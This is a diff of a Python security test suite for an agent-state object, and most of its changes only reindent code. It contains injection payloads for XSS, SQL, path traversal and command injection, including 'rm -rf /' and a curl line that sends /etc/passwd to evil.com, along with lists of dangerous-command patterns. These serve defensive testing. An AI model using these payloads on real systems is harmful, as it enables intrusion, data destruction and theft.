@@ -94,12 +94,12 @@ class TestIssue1017InputSanitizationVulnerabilities(SSotBaseTestCase):
         # Check that the malicious script tag appears in the serialized output
         # If this assertion fails, it proves the vulnerability exists
         self.assertNotIn("<script>", state_json,
-            f"VULNERABILITY: XSS payload '<script>' was not sanitized in state serialization")
+                        f"VULNERABILITY: XSS payload '<script>' was not sanitized in state serialization")
 
         # Check agent_input field specifically
         agent_input_str = json.dumps(state_dict.get("agent_input", {}))
         self.assertNotIn("<script>", agent_input_str,
-            f"VULNERABILITY: XSS payload '<script>' was not sanitized in agent_input field")
+                        f"VULNERABILITY: XSS payload '<script>' was not sanitized in agent_input field")
 
     def test_sql_injection_vulnerability_in_agent_input(self):
         """
@@ -128,20 +128,20 @@ class TestIssue1017InputSanitizationVulnerabilities(SSotBaseTestCase):
             # Test each SQL injection payload individually
             # Create DeepAgentState with malicious SQL payload
             malicious_state = DeepAgentState(
-                    user_request="Query my data",
-                    user_id=self.test_user_id,
-                    chat_thread_id=self.test_thread_id,
-                    run_id=f"{self.test_run_id}_sql_{i}",
-                    agent_input={
-                        "query_filter": payload,
-                        "user_name": payload,
-                        "search_term": payload,
-                        "database_query": {
-                            "where_clause": payload,
-                            "order_by": payload
-                        }
+                user_request="Query my data",
+                user_id=self.test_user_id,
+                chat_thread_id=self.test_thread_id,
+                run_id=f"{self.test_run_id}_sql_{i}",
+                agent_input={
+                    "query_filter": payload,
+                    "user_name": payload,
+                    "search_term": payload,
+                    "database_query": {
+                        "where_clause": payload,
+                        "order_by": payload
                     }
-                )
+                }
+            )
 
             # Convert to dict to simulate database processing
             state_dict = malicious_state.model_dump()
@@ -187,43 +187,43 @@ class TestIssue1017InputSanitizationVulnerabilities(SSotBaseTestCase):
 
         for i, payload in enumerate(path_payloads):
             # Test each path traversal payload individually
-                # Create DeepAgentState with malicious path payload
-                malicious_state = DeepAgentState(
-                    user_request="Process this file",
-                    user_id=self.test_user_id,
-                    chat_thread_id=self.test_thread_id,
-                    run_id=f"{self.test_run_id}_path_{i}",
-                    agent_input={
-                        "file_path": payload,
-                        "config_file": payload,
-                        "template_path": payload,
-                        "upload_destination": payload,
-                        "include_file": payload,
-                        "backup_location": {
-                            "path": payload,
-                            "alternative": f"/safe/path/{payload}"
-                        }
-                    }
-                )
+            # Create DeepAgentState with malicious path payload
+            malicious_state = DeepAgentState(
+            user_request="Process this file",
+            user_id=self.test_user_id,
+            chat_thread_id=self.test_thread_id,
+            run_id=f"{self.test_run_id}_path_{i}",
+            agent_input={
+            "file_path": payload,
+            "config_file": payload,
+            "template_path": payload,
+            "upload_destination": payload,
+            "include_file": payload,
+            "backup_location": {
+            "path": payload,
+            "alternative": f"/safe/path/{payload}"
+            }
+            }
+            )
 
-                # Convert to dict to simulate file processing
-                state_dict = malicious_state.model_dump()
-                agent_input_str = json.dumps(state_dict.get("agent_input", {}))
+            # Convert to dict to simulate file processing
+            state_dict = malicious_state.model_dump()
+            agent_input_str = json.dumps(state_dict.get("agent_input", {}))
 
-                # VULNERABILITY CHECK: If this passes, path traversal is possible
-                # These assertions should FAIL to prove vulnerability exists
-                path_patterns = ["../", "..\\", "%2F", "%5C", "/etc/passwd", "system32"]
-                for pattern in path_patterns:
-                    if pattern in payload:
-                        self.assertNotIn(pattern, agent_input_str,
-                            f"VULNERABILITY: Path traversal pattern '{pattern}' from payload '{payload}' was not sanitized")
+            # VULNERABILITY CHECK: If this passes, path traversal is possible
+            # These assertions should FAIL to prove vulnerability exists
+            path_patterns = ["../", "..\\", "%2F", "%5C", "/etc/passwd", "system32"]
+            for pattern in path_patterns:
+                if pattern in payload:
+                    self.assertNotIn(pattern, agent_input_str,
+                        f"VULNERABILITY: Path traversal pattern '{pattern}' from payload '{payload}' was not sanitized")
 
-                # Check for sensitive file paths
-                sensitive_paths = ["/etc/passwd", "system32", "hosts", "config/sam"]
-                for path in sensitive_paths:
-                    if path in payload:
-                        self.assertNotIn(path, agent_input_str,
-                            f"VULNERABILITY: Sensitive path '{path}' from payload '{payload}' was not blocked")
+            # Check for sensitive file paths
+            sensitive_paths = ["/etc/passwd", "system32", "hosts", "config/sam"]
+            for path in sensitive_paths:
+                if path in payload:
+                    self.assertNotIn(path, agent_input_str,
+                        f"VULNERABILITY: Sensitive path '{path}' from payload '{payload}' was not blocked")
 
     def test_code_injection_vulnerability_in_agent_input(self):
         """
@@ -254,43 +254,43 @@ class TestIssue1017InputSanitizationVulnerabilities(SSotBaseTestCase):
 
         for i, payload in enumerate(code_payloads):
             # Test each code injection payload individually
-                # Create DeepAgentState with malicious code payload
-                malicious_state = DeepAgentState(
-                    user_request="Execute this analysis",
-                    user_id=self.test_user_id,
-                    chat_thread_id=self.test_thread_id,
-                    run_id=f"{self.test_run_id}_code_{i}",
-                    agent_input={
-                        "expression": payload,
-                        "formula": payload,
-                        "script_content": payload,
-                        "command": payload,
-                        "eval_string": payload,
-                        "custom_logic": {
-                            "calculation": payload,
-                            "condition": payload
-                        }
-                    }
-                )
+            # Create DeepAgentState with malicious code payload
+            malicious_state = DeepAgentState(
+            user_request="Execute this analysis",
+            user_id=self.test_user_id,
+            chat_thread_id=self.test_thread_id,
+            run_id=f"{self.test_run_id}_code_{i}",
+            agent_input={
+            "expression": payload,
+            "formula": payload,
+            "script_content": payload,
+            "command": payload,
+            "eval_string": payload,
+            "custom_logic": {
+            "calculation": payload,
+            "condition": payload
+            }
+            }
+            )
 
-                # Convert to dict to simulate code processing
-                state_dict = malicious_state.model_dump()
-                agent_input_str = json.dumps(state_dict.get("agent_input", {}))
+            # Convert to dict to simulate code processing
+            state_dict = malicious_state.model_dump()
+            agent_input_str = json.dumps(state_dict.get("agent_input", {}))
 
-                # VULNERABILITY CHECK: If this passes, code injection is possible
-                # These assertions should FAIL to prove vulnerability exists
-                dangerous_functions = ["__import__", "eval", "exec", "system", "subprocess", "os."]
-                for func in dangerous_functions:
-                    if func in payload:
-                        self.assertNotIn(func, agent_input_str,
-                            f"VULNERABILITY: Dangerous function '{func}' from payload '{payload}' was not sanitized")
+            # VULNERABILITY CHECK: If this passes, code injection is possible
+            # These assertions should FAIL to prove vulnerability exists
+            dangerous_functions = ["__import__", "eval", "exec", "system", "subprocess", "os."]
+            for func in dangerous_functions:
+                if func in payload:
+                    self.assertNotIn(func, agent_input_str,
+                        f"VULNERABILITY: Dangerous function '{func}' from payload '{payload}' was not sanitized")
 
-                # Check for template injection patterns
-                template_patterns = ["${", "#{", "{{", "<%=", "`", "$("]
-                for pattern in template_patterns:
-                    if pattern in payload:
-                        self.assertNotIn(pattern, agent_input_str,
-                            f"VULNERABILITY: Template injection pattern '{pattern}' from payload '{payload}' was not sanitized")
+            # Check for template injection patterns
+            template_patterns = ["${", "#{", "{{", "<%=", "`", "$("]
+            for pattern in template_patterns:
+                if pattern in payload:
+                    self.assertNotIn(pattern, agent_input_str,
+                        f"VULNERABILITY: Template injection pattern '{pattern}' from payload '{payload}' was not sanitized")
 
     def test_system_command_injection_vulnerability(self):
         """
@@ -317,42 +317,42 @@ class TestIssue1017InputSanitizationVulnerabilities(SSotBaseTestCase):
 
         for i, payload in enumerate(command_payloads):
             # Test each command injection payload individually
-                # Create DeepAgentState with malicious command payload
-                malicious_state = DeepAgentState(
-                    user_request="Run system analysis",
-                    user_id=self.test_user_id,
-                    chat_thread_id=self.test_thread_id,
-                    run_id=f"{self.test_run_id}_cmd_{i}",
-                    agent_input={
-                        "system_command": payload,
-                        "shell_exec": payload,
-                        "process_args": payload,
-                        "script_params": payload,
-                        "os_command": {
-                            "cmd": payload,
-                            "args": [payload, "normal_arg"]
-                        }
-                    }
-                )
+            # Create DeepAgentState with malicious command payload
+            malicious_state = DeepAgentState(
+            user_request="Run system analysis",
+            user_id=self.test_user_id,
+            chat_thread_id=self.test_thread_id,
+            run_id=f"{self.test_run_id}_cmd_{i}",
+            agent_input={
+            "system_command": payload,
+            "shell_exec": payload,
+            "process_args": payload,
+            "script_params": payload,
+            "os_command": {
+            "cmd": payload,
+            "args": [payload, "normal_arg"]
+            }
+            }
+            )
 
-                # Convert to dict to simulate command processing
-                state_dict = malicious_state.model_dump()
-                agent_input_str = json.dumps(state_dict.get("agent_input", {}))
+            # Convert to dict to simulate command processing
+            state_dict = malicious_state.model_dump()
+            agent_input_str = json.dumps(state_dict.get("agent_input", {}))
 
-                # VULNERABILITY CHECK: If this passes, command injection is possible
-                # These assertions should FAIL to prove vulnerability exists
-                command_separators = [";", "&", "|", "&&", "||", "`", "$()"]
-                for separator in command_separators:
-                    if separator in payload:
-                        self.assertNotIn(separator, agent_input_str,
-                            f"VULNERABILITY: Command separator '{separator}' from payload '{payload}' was not sanitized")
+            # VULNERABILITY CHECK: If this passes, command injection is possible
+            # These assertions should FAIL to prove vulnerability exists
+            command_separators = [";", "&", "|", "&&", "||", "`", "$()"]
+            for separator in command_separators:
+                if separator in payload:
+                    self.assertNotIn(separator, agent_input_str,
+                        f"VULNERABILITY: Command separator '{separator}' from payload '{payload}' was not sanitized")
 
-                # Check for dangerous commands
-                dangerous_commands = ["rm -rf", "del /f", "wget", "curl", "nc ", "bash", "powershell", "python -c"]
-                for cmd in dangerous_commands:
-                    if cmd in payload:
-                        self.assertNotIn(cmd, agent_input_str,
-                            f"VULNERABILITY: Dangerous command '{cmd}' from payload '{payload}' was not sanitized")
+            # Check for dangerous commands
+            dangerous_commands = ["rm -rf", "del /f", "wget", "curl", "nc ", "bash", "powershell", "python -c"]
+            for cmd in dangerous_commands:
+                if cmd in payload:
+                    self.assertNotIn(cmd, agent_input_str,
+                        f"VULNERABILITY: Dangerous command '{cmd}' from payload '{payload}' was not sanitized")
 
     def test_api_key_extraction_vulnerability(self):
         """
@@ -390,49 +390,49 @@ class TestIssue1017InputSanitizationVulnerabilities(SSotBaseTestCase):
         for i, payload in enumerate(extraction_payloads):
             # Test each API key extraction payload individually
 
-                # Temporarily set fake environment variables for testing
-                with self.temp_env_vars(**fake_secrets):
+            # Temporarily set fake environment variables for testing
+            with self.temp_env_vars(**fake_secrets):
 
-                    # Create DeepAgentState with extraction payload
-                    malicious_state = DeepAgentState(
-                        user_request="Process configuration",
-                        user_id=self.test_user_id,
-                        chat_thread_id=self.test_thread_id,
-                        run_id=f"{self.test_run_id}_extract_{i}",
-                        agent_input={
-                            "config_template": payload,
-                            "api_config": payload,
-                            "environment_var": payload,
-                            "secret_ref": payload,
-                            "credential_path": payload,
-                            "template_data": {
-                                "reference": payload,
-                                "fallback": f"default_or_{payload}"
-                            }
-                        }
-                    )
+                # Create DeepAgentState with extraction payload
+                malicious_state = DeepAgentState(
+                user_request="Process configuration",
+                user_id=self.test_user_id,
+                chat_thread_id=self.test_thread_id,
+                run_id=f"{self.test_run_id}_extract_{i}",
+                agent_input={
+            "config_template": payload,
+            "api_config": payload,
+            "environment_var": payload,
+            "secret_ref": payload,
+            "credential_path": payload,
+            "template_data": {
+            "reference": payload,
+            "fallback": f"default_or_{payload}"
+            }
+            }
+            )
 
-                    # Convert to dict and check for secret exposure
-                    state_dict = malicious_state.model_dump()
-                    agent_input_str = json.dumps(state_dict.get("agent_input", {}))
+                # Convert to dict and check for secret exposure
+                state_dict = malicious_state.model_dump()
+                agent_input_str = json.dumps(state_dict.get("agent_input", {}))
 
-                    # VULNERABILITY CHECK: If this passes, secrets could be exposed
-                    # These assertions should FAIL to prove vulnerability exists
-                    for secret_name, secret_value in fake_secrets.items():
-                        self.assertNotIn(secret_value, agent_input_str,
-                            f"VULNERABILITY: Secret '{secret_name}' with value '{secret_value}' was exposed through payload '{payload}'")
+                # VULNERABILITY CHECK: If this passes, secrets could be exposed
+                # These assertions should FAIL to prove vulnerability exists
+                for secret_name, secret_value in fake_secrets.items():
+                    self.assertNotIn(secret_value, agent_input_str,
+                        f"VULNERABILITY: Secret '{secret_name}' with value '{secret_value}' was exposed through payload '{payload}'")
 
-                    # Check that extraction patterns are not processed
-                    extraction_patterns = ["${", "#{", "{{", "<%=", "%", "process.env", "os.environ"]
-                    for pattern in extraction_patterns:
-                        if pattern in payload:
-                            # If the pattern is still there, that could mean it wasn't processed (good)
-                            # But if it's gone and secrets appear, that's a vulnerability
-                            if pattern not in agent_input_str:
-                                # Pattern was processed - check if any secrets leaked
-                                for secret_value in fake_secrets.values():
-                                    self.assertNotIn(secret_value, agent_input_str,
-                                        f"VULNERABILITY: Pattern '{pattern}' was processed and secret leaked through payload '{payload}'")
+                # Check that extraction patterns are not processed
+                extraction_patterns = ["${", "#{", "{{", "<%=", "%", "process.env", "os.environ"]
+                for pattern in extraction_patterns:
+                    if pattern in payload:
+                        # If the pattern is still there, that could mean it wasn't processed (good)
+                        # But if it's gone and secrets appear, that's a vulnerability
+                        if pattern not in agent_input_str:
+                            # Pattern was processed - check if any secrets leaked
+                            for secret_value in fake_secrets.values():
+                                self.assertNotIn(secret_value, agent_input_str,
+                                    f"VULNERABILITY: Pattern '{pattern}' was processed and secret leaked through payload '{payload}'")
 
     def test_nested_injection_vulnerability_complex_payloads(self):
         """
@@ -446,70 +446,70 @@ class TestIssue1017InputSanitizationVulnerabilities(SSotBaseTestCase):
         # Create complex multi-vector payloads
         complex_payloads = [
             {
-                "description": "<script>fetch('/api/secrets').then(r=>r.text()).then(d=>eval(d))</script>",
-                "query": "'; DROP TABLE users; <img src=x onerror=eval('fetch(\"/api/admin\")')> --",
-                "file_path": "../../../etc/passwd<script>alert('XSS')</script>",
-                "command": "; curl http://evil.com/exfil?data=$(cat /etc/passwd | base64)"
+            "description": "<script>fetch('/api/secrets').then(r=>r.text()).then(d=>eval(d))</script>",
+            "query": "'; DROP TABLE users; <img src=x onerror=eval('fetch(\"/api/admin\")')> --",
+            "file_path": "../../../etc/passwd<script>alert('XSS')</script>",
+            "command": "; curl http://evil.com/exfil?data=$(cat /etc/passwd | base64)"
             },
             {
-                "nested": {
-                    "deep": {
-                        "injection": "__import__('os').system('rm -rf / && <script>alert(1)</script>')",
-                        "sql": "' UNION SELECT password, ''; DROP TABLE users; --' FROM users WHERE id='<svg onload=alert(1)>'",
-                        "path": "..\\..\\..\\windows\\system32\\config\\sam<iframe src='javascript:alert(1)'>"
-                    }
-                }
+            "nested": {
+            "deep": {
+            "injection": "__import__('os').system('rm -rf / && <script>alert(1)</script>')",
+            "sql": "' UNION SELECT password, ''; DROP TABLE users; --' FROM users WHERE id='<svg onload=alert(1)>'",
+            "path": "..\\..\\..\\windows\\system32\\config\\sam<iframe src='javascript:alert(1)'>"
+            }
+            }
             },
             {
-                "config": "${process.env.SECRET_KEY || eval('__import__(\\\"os\\\").system(\\\"whoami\\\")')}"
+            "config": "${process.env.SECRET_KEY || eval('__import__(\\\"os\\\").system(\\\"whoami\\\")')}"
             }
         ]
 
         for i, payload_dict in enumerate(complex_payloads):
             # Test each complex nested payload individually
-                # Create DeepAgentState with complex nested payload
-                malicious_state = DeepAgentState(
-                    user_request="Process complex data structure",
-                    user_id=self.test_user_id,
-                    chat_thread_id=self.test_thread_id,
-                    run_id=f"{self.test_run_id}_complex_{i}",
-                    agent_input=payload_dict
-                )
+            # Create DeepAgentState with complex nested payload
+            malicious_state = DeepAgentState(
+            user_request="Process complex data structure",
+            user_id=self.test_user_id,
+            chat_thread_id=self.test_thread_id,
+            run_id=f"{self.test_run_id}_complex_{i}",
+            agent_input=payload_dict
+            )
 
-                # Convert to dict to simulate processing
-                state_dict = malicious_state.model_dump()
-                agent_input_str = json.dumps(state_dict.get("agent_input", {}))
+            # Convert to dict to simulate processing
+            state_dict = malicious_state.model_dump()
+            agent_input_str = json.dumps(state_dict.get("agent_input", {}))
 
-                # VULNERABILITY CHECK: Comprehensive checks for all attack vectors
-                # These assertions should FAIL to prove vulnerabilities exist
+            # VULNERABILITY CHECK: Comprehensive checks for all attack vectors
+            # These assertions should FAIL to prove vulnerabilities exist
 
-                # XSS checks
-                xss_patterns = ["<script>", "<img", "<svg", "<iframe", "javascript:", "onerror=", "onload="]
-                for pattern in xss_patterns:
-                    self.assertNotIn(pattern, agent_input_str,
+            # XSS checks
+            xss_patterns = ["<script>", "<img", "<svg", "<iframe", "javascript:", "onerror=", "onload="]
+            for pattern in xss_patterns:
+                self.assertNotIn(pattern, agent_input_str,
                         f"VULNERABILITY: XSS pattern '{pattern}' was not sanitized in complex payload {i}")
 
-                # SQL injection checks
-                sql_patterns = ["DROP TABLE", "UNION SELECT", "' OR", "'--", "'; "]
-                for pattern in sql_patterns:
-                    self.assertNotIn(pattern, agent_input_str,
+            # SQL injection checks
+            sql_patterns = ["DROP TABLE", "UNION SELECT", "' OR", "'--", "'; "]
+            for pattern in sql_patterns:
+                self.assertNotIn(pattern, agent_input_str,
                         f"VULNERABILITY: SQL pattern '{pattern}' was not sanitized in complex payload {i}")
 
-                # Path traversal checks
-                path_patterns = ["../", "..\\", "/etc/passwd", "system32", "config/sam"]
-                for pattern in path_patterns:
+            # Path traversal checks
+            path_patterns = ["../", "..\\", "/etc/passwd", "system32", "config/sam"]
+            for pattern in path_patterns:
                     self.assertNotIn(pattern, agent_input_str,
                         f"VULNERABILITY: Path pattern '{pattern}' was not sanitized in complex payload {i}")
 
-                # Command injection checks
-                cmd_patterns = ["; curl", "rm -rf", "base64", "$(cat", "__import__", "eval("]
-                for pattern in cmd_patterns:
+            # Command injection checks
+            cmd_patterns = ["; curl", "rm -rf", "base64", "$(cat", "__import__", "eval("]
+            for pattern in cmd_patterns:
                     self.assertNotIn(pattern, agent_input_str,
                         f"VULNERABILITY: Command pattern '{pattern}' was not sanitized in complex payload {i}")
 
-                # Template injection checks
-                template_patterns = ["${process.env", "${", "eval('"]
-                for pattern in template_patterns:
+            # Template injection checks
+            template_patterns = ["${process.env", "${", "eval('"]
+            for pattern in template_patterns:
                     self.assertNotIn(pattern, agent_input_str,
                         f"VULNERABILITY: Template pattern '{pattern}' was not sanitized in complex payload {i}")
 
